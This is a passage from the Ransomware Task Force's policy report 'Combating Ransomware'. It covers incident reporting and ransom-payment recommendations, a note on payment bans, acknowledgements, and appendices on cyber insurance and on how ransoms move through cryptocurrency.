\nransomware incident report format should be developed through a multi-stakeholder process. Any organization \nreporting a ransomware incident or reporting on behalf of another organization could use this format. The format \nshould encompass both non-technical information (such as affected organization type or ransom amount) and \ntechnical information (such as indicators of compromise). It should also leverage existing formats, such as STIX71 \nand the MITRE ATT&CK72 framework for technical data and suspicious activity reports, to make integration across \nreporting systems as easy as possible. The required fields should be kept to a minimum, but the format should \nenable more technically capable reporting entities to include more detailed information. Creating such a standard \nformat would also make aggregating and anonymizing reports easier. \n\nTiming: 6-12 months. \t Lead: �A nonprofit, such as the Institute for Security & Technology or the Cyber Threat \nAlliance, and international equivalents. \n\nAction 4.2.3: Encourage organizations to report ransomware incidents. \n\nNational governments should encourage organizations that experience a ransomware attack to report the \nincident to the RIRN using the common format. This encouragement could take the form of the “See Something, \nSay Something” campaign, and would note the benefits of reporting, the low level of effort required, and the \nprotections built into the reporting process (for example, that reports can be made anonymously). The government \nshould use different outreach methods for different parts of the ecosystem, for example, using tailored outreach \nfor K-12 engagement versus engagement with the manufacturing sector. \n\nTiming: 6-12 months, updated ongoing as needed.  \nLead: Government cybersecurity agency or cyber center; DHS CISA in the U.S., with support from relevant \ngovernment, industry, academia, civil society ransomware experts to craft the message.\n\nAction 4.2.4: Require organizations and incident response entities to share ransomware payment \ninformation with a national government prior to payment.\n\nIn the US, 54 states and territories have breach disclosure laws, and many sectors also have federal reporting \nrequirements, such as the Gramm-Leach-Bliley Act (in the financial sector) and Sarbanes-Oxley (for publicly traded \ncompanies). In the European Union, the Directive on Security of Network and Information Systems (NIS Directive) \nrequires essential entities to report data breaches. Updating breach disclosure laws to include a ransom payment \ndisclosure requirement would help increase the understanding of the scope and scale of the crime, allow for better \nestimates of the societal impact of these payments, and enable better targeting of disruption activities. Further, \nrequiring ransomware victims to report details about the incident prior to paying the ransom would enable national \ngovernments to take actions such as issuing a freeze letter to cryptocurrency exchanges, as called for in Action \n2.1.4. Finally, publishing summaries of the information reported under this requirement will help organizations \nunderstand how preparative measures need to adapt as attacks evolve. \n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 47Combating Ransomware\n\nThis mandate should require organizations to report directly to a non-regulatory government agency. In turn, \na receiving agency should share the reported information with other appropriate, non-regulatory government \nagencies as rapidly as possible and, after appropriate anonymization, to the RIRN. To reduce the burden on \nvictim organizations, the mandatory report should only encompass limited information, such as ransom date, \ndemand, payment instructions (e.g., wallet number and transaction hashes), and amount, and it should use \nthe standard reporting format developed through Action 4.2.2. However, the reporting process should allow \norganizations to provide additional technical information about the incident when they can, and use insurance \nproviders or incident response entities to report on their behalf. In order to avoid forcing organizations to \nput themselves in potential regulatory jeopardy, the reporting requirement should incorporate limited liability \nprotections, including that the report cannot form the basis for a regulatory or other enforcement action. When \nenacting this mandate, governments should consider appropriate penalties for organizations that do not comply \nwith the requirement. \n\nTiming: 12-24 months. \t Lead: U.S. Federal government, and international equivalents. \n\nObjective 4.3:  \nRequire organizations to consider alternatives to paying ransoms\n\nWhile most leaders oppose the idea of paying ransoms and only reluctantly agree to \nmake a payment, they may arrive at the decision based on limited information. A common \nmisperception is that the only alternative to payment is entirely rebuilding the network; that \noption might be prohibitively costly or take too long for organizations that have critical services \nthat need immediate restoration. However, in many cases, viable alternatives exist between \npayment and a full network rebuild, such as restoring data from unencrypted shadow copies. \nFinally, a small minority of organizations might assume that paying the ransom will be the \neasiest path to restoring operations and may not otherwise review their alternatives. \n\nRequiring organizations to analyze options before paying ransoms could enable more \norganizations to choose alternative paths. However, even if governments choose not to \nmake these recommendations mandatory, they should still be incorporated as best practices \nin the Ransomware Framework developed under Action 3.1.1.\n\nAction 4.3.1: Require organizations to review alternatives before making payments. \n\nAlthough ransomware attackers often try to use time pressure to try to persuade victims to pay, often other \noptions are available. Unencrypted shadow copies of data might be accessible, allowing a victim to recover their \nbusiness operations, or a decryption key might exist for that particular ransomware. If ransomware victims have a \nlegal requirement to conduct a due diligence review before making a payment, then they would have the ability to \npush back on demands for immediate payment. This review would also reveal whether options between payment \nand rebuilding the network from scratch are viable. For example, the mandate could require organizations to \nconsult with initiatives like No More Ransom to determine if their information can be decrypted without paying. \n\nSuch reviews should be scaled to the size and criticality of the organization; for SMBs, the review might only \nconsist of two or three actions. If more organizations actively seek alternatives to payment, fewer will feel \n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 48Combating Ransomware\n\ncompelled to pay. National governments should enact a legal requirement for conducting the review; in the U.S. \ncontext, the private sector should develop what constitutes the due diligence review as part of the cost-benefit \nanalysis matrix in Action 4.3.3.\n\nTiming: 12-24 months. \t Lead: U.S. Federal government and international equivalents. \n\nAction 4.3.2: Require organizations to conduct a cost-benefit assessment prior to making a ransom \npayment. \n\nIn addition to searching for payment alternatives, organizations should also compare the costs of paying the \nransom with those of not paying. Given the complexities involved, the costs associated with either option are not \nnecessarily obvious without analysis. Many costs will be incurred regardless of whether or not an organization \npays the ransom; for example, a company will be liable for breach notification costs regardless of whether the \nattacker upholds their promise not to further release the data if the ransom is paid. Consequently, such costs \nshould not factor into the decision. In many cases, the analysis could show that paying the ransom is not in fact \nthe cheaper option. \n\nThe Task Force recommends that national governments require organizations to conduct a cost-benefit analysis \nprior to making a ransom payment. Such statutes could also require medium- to large enterprises to document \nthis cost-benefit analysis prior to making a payment or authorizing their insurance provider to make a payment on \ntheir behalf. Once a standard cost-benefit analysis matrix is developed, as called for in Action 4.3.3, governments \ncould require the use of the standard matrix to facilitate inter-organization comparisons and data collection. \n\nTiming: 12-24 months Lead. \t Lead: U.S. Federal government and international equivalents.\n\nAction 4.3.3: Develop a standard cost-benefit analysis matrix. \n\nAs noted in 4.3.2, analyzing the costs associated with a payment decision can prove challenging. Many \norganizations would benefit from having a standard analytic matrix to carry out this task. However, most existing \ndecision guides do not explicitly tackle this question and clearly lay out the various cost factors. Therefore, the \nTask Force recommends that the Ransomware Framework called for in Action 3.1.1 specifically include a cost-\nbenefit matrix. This matrix should enable organizations to identify the costs associated with not paying compared \nto the costs of paying the ransom, as well as which costs to exclude from the analysis because they are incurred in \neither case. \n\nTiming: 12-24 months. \t Lead: NIST for the US, and international equivalents, with private sector participation \n\nA Comprehensive Framework for Action: Goal #4\n\n\n\nIST 49Combating Ransomware\n\nThe question of whether to prohibit payment of ransoms has become increasingly pressing, and was \nraised by every working group in the Task Force. The argument in favor of a ransom ban holds that \nransomware is primarily motivated by profit, and if the potential for a payout is removed, attackers \nwill shift away from this tactic. A further argument is that ransom profits are used to fund other, more \npernicious crime, such as human trafficking, child exploitation, terrorism, and creation of weapons  \nof mass destruction. When viewed with that lens, the case for prohibiting payments is clear. \n\nThe challenge comes in determining how to make such a measure practical, as there remains a lack \nof organizational cybersecurity maturity across sectors, sizes of organization, and geographies. \nRansomware attackers require little risk or effort to launch attacks, so a prohibition on ransom \npayments would not necessarily lead them to move into other areas. Rather, they would likely continue \nto mount attacks and test the resolve of both victim organizations and their regulatory authorities.  \nTo apply additional pressure, they would target organizations considered more essential to society, \nsuch as healthcare providers, local governments, and other custodians of critical infrastructure. \n\nWere a government to take a hardline approach on non-payment, perhaps even offering to shore \nup victims in their jurisdiction in some manner, attackers will look for other potential targets before \nmoving to new sources of revenue. This means they will focus on countries or sectors where \ngovernments have not implemented the same policy or are unable to provide a safety net for victims. \nEven in jurisdictions that offer support for critical entities, organizations that do not qualify for this \nsupport may instead pay the ransom without disclosing the incident. This could then open them  \nto further extortion. \n\nAs such, any intent to prohibit payments must first consider how to build organizational cybersecurity \nmaturity, and how to provide an appropriate backstop to enable organizations to weather the initial \nperiod of extreme testing. Ideally, such an approach would also be coordinated internationally to  \navoid giving ransomware attackers other avenues to pursue. \n\nWith all these pragmatic considerations in mind, the Ransomware Task Force did not reach \nconsensus on prohibiting ransom payments, though we do agree that payments should be \ndiscouraged as far as possible. We recognize, though, that some governments may want to \npursue ransomware payment prohibitions based on their policy judgments. Given the potential \nconsequences, the Task Force has identified three factors that governments should consider  \nto reduce the negative impacts of such prohibitions:\n\nA Note on Prohibiting  \nRansomware Payments\n\nA Note on Prohibiting Ransomware Payment\n\n\n\n50IST Combating Ransomware\n\n \n\n \n\n \nTimeline \n  \nGovernments and organizations need time to adapt to  \nsuch a dramatic change in the law, so prohibitions cannot  \nbe enacted immediately. For example, governments need \ntime to set up victim protection and support programs, as \ndetailed below. Insurance companies need time to update policies to  \nreflect the payment prohibition. The payment facilitator ecosystem would need \ntime to shut down operations in an orderly fashion. Thus, a prohibition statute \nshould establish milestones or conditions that would need to be met before the \nprohibition would go into effect.  \n\n \nPhasing \n \nProhibitions should be implemented in a phased manner, \npotentially over a matter of years. Phasing could be based on \nsector: for example, a prohibition could be enacted on public \nentities before it is extended to the private sector.  \n\n \nVictim Protection and Support \n \nTo help offset the potential burden on victims, \ngovernments should provide strong protection and support \npolicies. Examples of such policies include the Cyber Response and Recovery \nFund,73 which could be used to help cover business continuity and remediation \ncosts for organizations attacked with ransomware; establish rapid response \nteams to assist life-line organizations (such as hospitals) to restore functionality \nquickly; and provide liability protection for business interruptions caused by \nrefusing to pay ransoms.\n\nA Note on Prohibiting Ransomware Payment\n\nFactors to Consider before Pursuing a  \nRansomware Payment Prohibition\n\n1\n\n2\n\n3\n\n\n\nIST 51Combating Ransomware\n\nThe Ransomware Task Force developed the recommendations outlined in this report to provide  \na multi-pronged approach to countering ransomware, and it will be crucial for organizations  \nacross sectors to work together and act immediately to tackle this challenge. Make no mistake: \nreducing the ransomware threat will not be easy, and it will not be accomplished by any individual \ngovernment or organization alone; this effort will require coordination, collaboration, and investment \nof time and resources.\n\nThe persistence of safe harbors and the challenge of tracing transactions through cryptocurrencies, \ncombined with the complexity of attribution and prosecution, stack the odds in ransomware \ncriminals’ favor. The old adage that a cybercriminal only has to be lucky once, while a defender \nhas to be lucky every minute of every day, has never been more true. Without major intervention, \nthe situation will only get worse as ransomware criminals continue to evolve their tactics and the \nproliferation of devices through the “internet of things” dramatically expands the attack surface. The \never-more lucrative ransomware industry will draw in more threat actors, compounding the problem. \n\nAdding to the challenge, victims of ransomware attacks may increasingly worry about reputational \nharm and be wary of disclosing details to the public. It is also likely that, as efforts to reduce \nransomware become more successful, actors may choose to target increasingly critical systems and \nnetworks, and adopt techniques that are more aggressive in order to combat increased defenses or \npayment obstruction techniques.\n\nYet failing to act is not an option. Allowing the ransomware challenge to go unchecked could have \ndisastrous consequences. Ransomware actors will only become more malicious, and worsening \nattacks will inevitably impact critical infrastructure, including communications, transportation, health \nand safety, distribution and logistics, utilities, and other critical infrastructure. Future attacks could \neasily combine techniques in ways that cause the infections to spread beyond their intended targets, \npotentially leading to far-reaching consequences, including loss of life.\n\nThe good news is that many of the recommendations outlined in this report may help improve \norganizations’ cybersecurity broadly, and lead to the establishment of new collaborations dedicated  \nto keeping our digital society safe. Indeed, we are still at the dawn of the digital age, and finding new \nways to address ransomware and other cyber threats will have benefits that last for decades to come.

this effort a success. The communities that operate day in and \nday out to grapple with challenges like ransomware comprise countless unsung heroes, and we are \nlucky to have been able to convene such a diverse and expansive group of dedicated professionals. \nThey graciously shared considerable amounts of their very limited time to provide their expertise and \nwork through proposed solutions as part of the three-month sprint of the Ransomware Task Force. \nAll of this took place during a period of significant high-level responsibilities across the industry.\n\nOur effort consisted of four main working groups, with an additional three special projects teams, \nsupplemented by numerous sub-working groups focused on everything from cryptocurrencies to “pizza \nparties” to cyber insurance. The Task Force consisted of members from civil society, private industry \n(from a range of sectors, including finance, cybersecurity, insurance, healthcare, and high technology), \nas well as members of government agencies from the United States and around the world. \n\nWe want to say a particular word of thanks to the RTF Working Group Co-Chairs, who poured an \nextraordinary amount of time and energy into organizing and leading large groups of experts, \nfacilitating what were often lively and healthy debates, developing and formulating complicated \nrecommendations, and lending their own extensive knowledge to the entire project. Their leadership \nelevated the process and this resulting report, and we cannot thank them enough.\n\nWe would also like to thank the many members of the Ransomware Task Force and their \norganizations, which afforded them the opportunity during otherwise exceedingly demanding times. \nThey answered this call to action with dedication and their substantial expertise. We appreciate the \nresources that each of them brought to the table and the professional connections they have tapped \ninto in order to move the process along and thoroughly vet our proposed solutions. \n\nLastly, we would like to thank the many unnamed people outside of the Task Force who answered our \nmany questions, discussed ideas, and gave feedback on our recommendations. \n\nWe believe the recommendations in this report, if undertaken together and with alacrity, could lead to \nreal change in the trajectory of this threat. All of this has been made possible by the dedication and \ncare of this incredible group of people.\n\nOn behalf of all of us at the Institute for Security and Technology, a sincere thank you.\n\nNote: RTF Members and Working Group Members volunteered their time, and contributed to the \nreport in working groups focused on specific problem sets. The resulting suite of recommendations \nin this document is a combination of all working group efforts, and each recommendation may not \nnecessarily reflect the views of every participant.\n\nAcknowledgements\n\nAcknowledgements\n\n\n\nIST 56Combating Ransomware\n\nRTF Co-Chairs\n\nRTF Working \nGroup Co-Chairs\n\nMegan Stifel, Global Cyber Alliance\n\nJohn Davis, Palo Alto Networks\n\nMichael Phillips, Resilience\n\nExecutive Director  \nPhilip Reiner, Institute for Security  \nand Technology\n\nJohn Davis, Palo Alto Networks\n\nMegan Stifel, Global Cyber Alliance\n\nMichael Phillips, Resilience\n\nKemba Walden, Microsoft\n\nJen Ellis, Rapid7\n\nChris Painter, The Global Forum on \nCyber Expertise Foundation Board\n\nMichael Daniel, Cyber Threat Alliance\n\nPhilip Reiner, Institute for Security  \nand Technology\n\nRTF Staff Sarah Powazek, RTF Program Manager, \nInstitute for Security and Technology\n\nAlexander Riabov, Communications \nManager, IST\n\nLeah Walker, Future Digital Security \nLeader Fellow, IST\n\nChuck Kapelke, Writing Support\n\nKathryn Pledger, Pledger Designs\n\nEmma Hollingsworth, Global Cyber \nAlliance\n\nRTF Membership Joel de la Garza, a16z\n\nTemi Adebambo, Amazon Web Services\n\nDavid Forcsey, Aspen Digital\n\nJeff Troy, Aviation ISAC\n\nRich Friedburg, Blackbaud\n\nAustin Berglas, BlueVoyant\n\nLewis Robinson, Center for Internet \nSecurity\n\nRoger Francis, CFC Underwriting\n\nDon Spies, Chainalysis\n\nPamela Clegg, CipherTrace\n\nBrad Garnett, Cisco\n\nMatt Olney, Cisco\n\nPeter Lefkowitz, Citrix\n\nBill Siegal, Coveware\n\nJames Perry, CrowdStrike\n\nStéphane Duguin, The CyberPeace \nInstitute \n\nYonatan Striem-Amit, Cybereason\n\nNeil Jenkins, Cyber Threat Alliance\n\nAndy Thompson, CyberArk \n\nAri Schwartz, Cybersecurity Coalition\n\nJohn Banghart, Cybersecurity Coalition \n\nRyan Weeks, Datto\n\nPatrice Drake, Deloitte\n\nKeith Mularski, Ernst & Young\n\nStacy O’Mara, FireEye\n\nNick Bennett, FireEye\n\nJill Fraser, Jefferson County, CO\n\nMark Orsi, K12 SIX\n\nKent Landfield, McAfee\n\nGinny Badanes, Microsoft\n\nKaja Ciglic, Microsoft\n\nPing Look, Microsoft\n\nJennifer Coughlin, Mullen Coughlin LLC\n\nJohn Guerriero, National Governors \nAssociation\n\nJustin Herring, New York Department  \nof Financial Services (NYDFS)\n\nAdrian McCabe, Palo Alto Networks\n\nAcknowledgements\n\n\n\nIST 57Combating Ransomware\n\nRTF Membership Sam Rubin, Palo Alto Networks\n\nSean Morgan, Palo Alto Networks\n\nBob Rudis, Rapid7\n\nScott King, Rapid7\n\nTod Beardsley, Rapid7\n\nAllan Liska, Recorded Future\n\nKatie Nickels, Red Canary\n\nAdam Flatley, Redacted\n\nDavis Hake, Resilience\n\nMichael Convertino, Resilience\n\nChris Lynam, Royal Canadian \nMounted Police’s National Cybercrime \nCoordination Unit (NC3)\n\nJeff Bonvie, Royal Canadian Mounted \nPolice’s National Cybercrime \nCoordination Unit (NC3)\n\nKevin Gronberg, SecurityScorecard\n\nRichard Perlotto, The Shadowserver \nFoundation \n\nBeau Woods, Stratigos Security\n\nJames Shank, Team Cymru\n\nMichael Garcia, Third Way\n\nCiaran Martin, University of Oxford \nBlavatnik School of Government\n\nEleanor Fairford, U.K. National Cyber \nSecurity Centre (NCSC)\n\nU.K. National Crime Agency (NCA)\n\nBridgette Walsh, U.S. Cybersecurity and \nInfrastructure Security Agency (CISA)\n\nU.S. Federal Bureau of Investigation \n(FBI)\n\nJonah Hill, U.S. Secret Service (USSS)\n\nBobby Chesney, U.T.

While \nthere are various types of insurance available that may cover losses associated with ransomware, including \nproperty insurance, kidnap and ransom insurance, and errors and omissions insurance, most insured \nransomware losses are covered by “affirmative” or “stand-alone” cyber insurance. “Affirmative” refers to \nexplicit cyber coverage within the text of an insurance policy; “stand-alone” refers to a dedicated insurance \npolicy for cyber risk, instead of cyber coverage available within a policy dedicated to other types of risk.\n\nThe first cyber insurance policies were designed to respond to lawsuits arising out of technology errors \nand omissions. As the internet developed, organizations digitized their operations, and as states passed \nlaws related to data breach notification and consumer privacy, cyber insurance firms expanded their \ncoverage to respond to the associated risks of data breach and business interruption. Today, cyber \ninsurance has become a standard part of cyber risk management strategies. Many cyber insurers and \nbrokers offer risk management services, education, and security tools to make their insureds more \nsecure, in addition to the traditional risk transfer of an insurance policy.\n\nWhile many insurance companies actively underwrite cyber risks, the market is led by 20 or so large insurers \nthat write the majority of cyber insurance policies. Less than 15% of organizations globally buy cyber \ninsurance, including about a third of all large companies in the United States. Internationally, the number \nof companies that have cyber insurance tends to be lower. While cyber insurance is growing, it remains \na niche product, and is less than 1% of the size of the greater property and casualty insurance market.74 \n\nCyber insurance policies typically cover legal, forensic, and technical experts to help ransomware victims \ntake the most effective steps to recover. (See Table 1, Common Components of a Modern Cyber Insurance \nPolicy.) Insurance concentrates this kind of expertise to help victims best orchestrate their options for \nrecovery. Policies may indemnify victims for any business interruption losses and defend them against any \nliability arising out of the event. Cyber insurance policies typically cover expertise to help a victim restore \n\nAppendix A:  \nCyber Insurance\n\nThis section provides an overview of the cyber \ninsurance market and the role it plays in dealing \nwith ransomware attacks.\n\nAppendix A\n\n\n\nIST 59Combating Ransomware\n\nTYPE OF \n COVERAGE\n\nPARTY DETAIL\n\nIncident  \nResponse Costs First\n\nThe cost of responding to a data breach event, including IT forensics, external services, and \nspecialists that might be employed; internal response costs; legal costs; and costs related to \nrestoring systems to their preexisting condition.\n\nData Privacy Liability Third\n\nThe cost of dealing with and compensating third-party individuals whose information is or \nmay have been compromised by a data breach event, including notification, compensation, \nproviding credit-watch services, and other third-party liabilities to affected data subjects.\n\nData Recovery Costs First The cost of reconstituting data and/or software that have been deleted or corrupted.\n\nBusiness  \nInterruption Loss First\n\nLost profits or extra expenses incurred due to the unavailability of IT systems or data as a \nresult of cyber attacks or non-malicious IT failures.\n\nRegulatory Defense Third\nProvides coverage for fines, penalties, and defense costs in the face of regulatory actions \ninvestigating violations of privacy law.\n\nCyber Extortion First\nThe cost of extortion response expertise to vet and evaluate all possible options for recovery, \nand, if required, negotiate and execute any ransom payment.\n\nMultimedia Liability Third\nDefense costs and civil damages arising from defamation, libel, slander, copyright/trademark \ninfringement, negligence in publication of any content in electronic or print media, as well as \ninfringement of the intellectual property of a third party.\n\nReputational Damage First\nLoss of revenues arising from an increase in customer churn or reduced transaction \nvolumes that can be directly attributed to the publication of a defined security breach \nevent.\n\nNetwork Liability Third\nThird-party liabilities arising from security events occurring within the organization’s IT network \nor passing through it in order to attack a third party.\n\nContingent Business \nInterruption Loss First\n\nCosts of business interruption to the insured resulting from the IT failure of a third party, such \nas a supplier, critical vendor, utility, or external IT services provider.\n\nTechnology Errors & \nOmissions Liability Third\n\nCoverage for third-party claims relating to failure to provide adequate technical service or \ntechnical products and software, including legal costs and expenses of allegations resulting \nfrom a cyber attack, error, or IT failure.\n\nFinancial Theft  \nand Fraud First\n\nThe direct financial loss suffered by an organization arising from the use of computers  \nto commit fraud or theft of money, securities, or other property.\n\nPhysical Asset \nDamage First\n\nFirst-party loss due to the destruction of hardware or other physical property resulting  \nfrom cyber attacks.\n\nTABLE 1: Common Components of a Modern Cyber Insurance Policy\n\nits computer systems from backups and, in the unfortunate circumstances in which the victim has \ndecided it is necessary, expertise to handle a ransom negotiation and effectuate an extortion payment. \nCyber insurance policies never require a victim to pay a ransom. Any decision to pay sits with the victim.\n\nAppendix A\n\n\n\nIST 60Combating Ransomware\n\nThousands of organizations have used cyber insurance to recover from ransomware attacks, \nincluding hospitals, cities, and schools, through comprehensive coverage and bringing to bear \nheavily vetted ransomware response expertise. Each year, cyber insurers pay out hundreds of \nmillions of dollars in cyber losses claimed by their insureds, including business income losses, data \nrecovery costs, and expert fees arising out of ransomware events.75 As ransomware has become \nmore frequent and destructive, ransomware losses have increased, impacting both insured and \ninsurer. As a result, a number of insurers have exited the cyber insurance market or reduced their \nparticipation. Firms that remain have invested heavily in their ability to properly assess cyber risk. \nWith approximately $1 trillion in insurance limits exposed, the cyber insurance market is incentivized \nto reduce the risks posed by ransomware.\n\nIn the insurance industry, periods of falling premiums, expanding coverage, and loosening \nunderwriting standards (resulting from increased competition) are referred to as “soft markets,” \nwhereas periods of rising premiums, coverage restrictions, and heightened underwriting standards \n(due to increased underwriting losses) are often referred to as “hard markets.” According to multiple \nreports, cyber insurance has entered a “hard market” phase.76 \n\nIn a hard market, the insurance industry can push insured organizations to better manage their \nrisk. Competing insurers may do this through rising underwriting standards and risk management \nstrategies, changes to price, and other innovations that align the insured organization’s incentives \ntoward risk management and risk transfer. This trend has been seen with respect to perils as \ndiverse as fire, piracy, hurricane, and kidnap for ransom; in each instance, the insurance sector has \nidentified and supported risk management practices and technologies that have bent the curve \nand ameliorated a significant risk, to the mutual benefit of the insured and the insurer. The cyber \ninsurance market should behave similarly; for example, after the major retail payment card breaches \nof 2013 and 2014, the cyber insurance market pushed compliance with PCI-DSS standards, industry \nstandards promulgated by the payment card industry that establish a base level of payment card \ncybersecurity.\n\nIn a hard market, the insurance industry can push insured \norganizations to better manage their risk.\n\nAppendix A\n\n\n\nIST 61Combating Ransomware\n\nRising Underwriting Standards in Response to Ransomware\n\nThe economics of the cyber insurance industry align with the victims of ransomware. As a result,  \nthe industry is incentivized to innovate, evolve, compete, and otherwise increase its expertise to \nprevent insured ransomware losses. As ransomware losses have accelerated, the cyber insurance \nmarket has adapted.\n\nImproved cyber-defense:  \nThe key adaptation has been investment in underwriting analysis to identify ransomware risk factors \nand developing the expertise to help firms secure themselves appropriately against a ransomware \nattack. Increased scrutiny of prospective insurance buyers is designed to incentivize firms to make \nappropriate security investments and become prepared. To accurately measure a firm’s ransomware \nrisk, cyber insurers are increasingly deploying supplemental ransomware underwriting applications, \nenlisting third-party cybersecurity firms to conduct additional assessments, and carrying out external \nscans of firms’ web-facing assets. Cyber insurers may deploy in-house security and risk engineering \nexpertise to proactively help insured organizations become more resilient in the face of ransomware \nrisk. A number of cyber insurers and insurance brokerage firms have established or acquired \ncybersecurity firms to provide managed threat detection, incident response, or security consulting \nservices to insureds in advance of a loss.\n\nMarket Strategies:  \nAnother adaptation comes from cyber insurers experimenting with different market strategies \nto incentivize organizations to increase their cybersecurity to become secure. These strategies \ninclude sublimits (i.e. reduced claim limits) for ransomware-related coverage; co-insurance (the \njoint assumption of a risk by the insured and insurer); increases in premium; and other changes or \nrequirements in the insurance coverage.77 Underwriters may refuse to offer insurance coverage \nto organizations that do not first establish an appropriate level of cybersecurity preparedness. For \ninstance, this may mean that an organization must confirm that it follows a recognized cybersecurity \nframework, or that it has deployed multi-factor authentication, or is managing the risks associated \nwith remote access to computer networks. While underwriting firms may defer in certain details, \nthe cyber insurance market is coalescing around certain baseline controls as a prerequisite to \ninsurability.78 Brokerages and risk management firms have also increased their advisory practices to \nmove organizations toward greater ransomware preparedness and insurability. \n\nOrganizations that lack basic cybersecurity hygiene may be uninsurable, which should spur greater \ninvestment in ransomware defenses. When the market works properly, organizations should be \nincentivized to reach an appropriate mix of insurance and security.79 \n\nProcess changes:  \nFinally, as a third adaptation, cyber insurance companies have modified many internal processes. \nFor example, some insurers have established close connections with national and global law \nenforcement to facilitate the sharing of data and threat intelligence.80 \n\nAppendix A\n\n\n\nIST 62Combating Ransomware\n\nRansomware payments are typically made in cryptocurrency. As cryptocurrency ownership \nrecords are maintained on the cryptographic ledger of a blockchain, ownership is not easily linked \nto identifiable individuals. Often the money does not flow straight from victim to criminal; it travels \nthrough a multi-step process involving different financial entities, each presenting insights into \ncriminal identities and opportunities for intervention.\n\nAppendix B:  \nThe Cryptocurrency Payment Process\n\nThis section expounds on this process, \nidentifies many of the key entities involved, \nand highlights where interventions could \noccur and how they could undermine the \nransomware business model. \n\nAppendix B\n\nThe following is a graphical representation of \nthe cryptocurrency payments process, and \nvarious potential points of intervention:\n\n\n\nIST 63Combating Ransomware\n\nFigure 6  Payment Pathway and Potential Intervention Points\n\nRansomware encrypts \nvictim's computer systems\n\nVictim exchanges Fiat Currency \nfor Cryptocurrency in anticipation \nof making payment.\n\nVictim pays ransom in \nCryptocurrency to the Wallet \naddress identified in the \nRansomware demand.\n\nRansom recipient distributes  \nransom to administrators and \naffiliates of the crime.\n\nCriminals further Obfuscate \nFunds through Cryptocurrency \nmixing services.\n\nCriminals transfer “MIXED” \nCryptocurrency to Exchanges for \ntransfer into Foreign Fiat Currency.\n\nCriminals use proceeds \nfrom crime.\n\nRANSOMWARE PAYMENT PATHWAY POTENTIAL INTERVENTION POINTS\n\nPREPARE AND RESPOND\n\n•\tPrepare.

Law enforcement may engage blockchain \nanalysis firms to investigate parties to cryptocurrency \ntransactions.\n\nAppendix B\n\n\n\nIST 64Combating Ransomware\n\nVictim Response\n\nRansom Payment\nIf a victim decides to pay the ransom, either they or an incident response vendor, such as a forensic \ninvestigator or negotiation firm, will need to withdraw funds from a financial institution to purchase \nthe cryptocurrency. This cryptocurrency is then transferred from the victim’s cryptocurrency wallet, a \ndigital storage service, facilitated by a cryptocurrency exchange, a private kiosk, or simply a wallet-to-\nwallet transfer to a new wallet address provided by the ransomware criminal. These victim-specific \naddresses are created by the criminal actors for the purpose of receiving the payments. Often \nthese will have never been used before, to avoid being associated with the threat actor’s previous \nactivity, and thus cannot be traced until funds are actually deposited into those wallet addresses \nby the victim. These are generally un-hosted wallets, which means they are not hosted with any \ncryptocurrency exchange that handles and monitors transactions.\n\nCryptocurrencies are outside of any one organization’s control, but their blockchains create public, \npermanent records of activity, whether legal or illicit. Blockchain analysis helps interpret public \nblockchain ledgers and, with the proper tools, government agencies, cryptocurrency businesses, and \nfinancial institutions can understand which real-world entities transact with each other. Blockchain \nanalytic companies, such as Chainalysis and CipherTrace, are able to show that a given transaction took \nplace between two different cryptocurrency exchanges, or between a cryptocurrency exchange and an \nillicit entity, such as a sanctioned individual or organization. With blockchain analysis tools and Know \nYour Customer (KYC) information, law enforcement can gain transparency into blockchain activity.\n\nWhile some illicit actors use privacy coins in an attempt to obfuscate their transactions, this more \nuntraceable form of cryptocurrency has not been adopted as widely as might be expected because \nthey are not as liquid as Bitcoin and other cryptocurrencies. Now that many exchanges have delisted \nprivacy coins following guidance from regulators, this payment method is becoming increasingly \nimpractical. Cryptocurrency is only useful if you can buy and sell goods and services or cash out into \nfiat, and that is much more difficult with privacy coins.\n\nStep 1\n\nStep 2\n\nWhen a victim is hit with a ransomware attack, they may engage one or more incident response entities \nto assist in the process of advising on, and potentially paying, the ransom. These firms include the \nvictim’s cyber-insurance provider (if they have coverage), law firms, negotiation firms, threat intelligence, \nand forensic investigators. \n\nEntities like negotiation firms communicate directly with ransomware threat actors and seek to lower \nthe ransom demand. Other organizations (for example, incident response firms, financial institutions, \netc.) may perform due diligence to ensure a payment would not violate sanctions, identify the extent  \nof applicable insurance coverage, and confirm that there is no publicly available decryption key.  \nThese firms may also assist the victim with deciding whether or not to pay the ransom.\n\n1\n\nAppendix B\n\n2\n\n\n\nIST 65Combating Ransomware\n\nRansomware Fund ObfuscationStep 3\nAfter receiving the ransomware payment in the designated digital wallet, the ransomware criminal \noften attempts to obfuscate these funds as quickly as possible to avoid detection and tracking. As \nnoted above, Bitcoin transactions are logged in a public ledger, so without obfuscation, a criminal \ncannot withdraw funds into cash without being tracked. One popular method for obfuscation is to \nroute funds through cryptocurrency mixing services, services that create a series of transactions to \nmix one set of funds with another, muddying the public ledger by mixing in legitimate “traffic” with \nillicit ransomware funds.\n\nAnother method for obfuscation is “chainhopping,” exchanging funds in one cryptocurrency \nfor another. Tracking funds after they switch currencies can be extremely challenging. These \ntransactions can occur at centralized or decentralized cryptocurrency exchanges, which are \ndiscussed further in Step 4, or via atomic swaps and other technical means. \n\nCryptocurrency mixing services\n\nCryptocurrency mixing services (often “mixers” or “tumblers”) are commonly used by \nransomware actors and others engaged in illicit activity. As described above, a blockchain is \na record of the source and destination of every transaction. As a result, blockchain analytic \nfirms can trace cryptocurrency transactions, supporting both law enforcement efforts to \nidentify criminals and cryptocurrency exchange efforts to screen clients for links to crime. \nRansomware actors use mixers to try to prevent such tracing by making it difficult to \nidentify the true source of transactions on the blockchain.\n\nMixers can function in multiple ways, but typically they rely upon a group of people coming \ntogether to pool their cryptocurrency (like bitcoin), with each taking back different bitcoins \nof the same value. These different bitcoins they receive will have a different source than the \nones they submitted for “mixing.” This process is typically managed by a centralized mixing \nservice, which charges a fee — often between 1-10% of the amount mixed. Some mixing \nservices take additional steps to complicate and obfuscate the source of funds, including \nintermediate trades with privacy coins such as Monero. There are hundreds of mixing \nservices available on the internet.\n\nAppendix B\n\n3\n\n\n\nIST 66Combating Ransomware\n\nWhere do the funds go?\n\nFigure 7  Ransomware Wallets Sending to  \nDarknet Marketplaces\n\nRansomware criminals may choose to not \nimmediately withdraw funds into cash for \ntheir own use. In the ransomware-as-a-\nservice (RaaS) model described earlier in the \nreport, several criminal affiliates (essentially \ncontractors) are involved in the exploitation, \nencryption, and ransom demand, all of whom \nrequire payouts. Criminal gangs also may \nuse cryptocurrency itself to invest in further \nmalicious infrastructure and services.\n\nIn 2020, 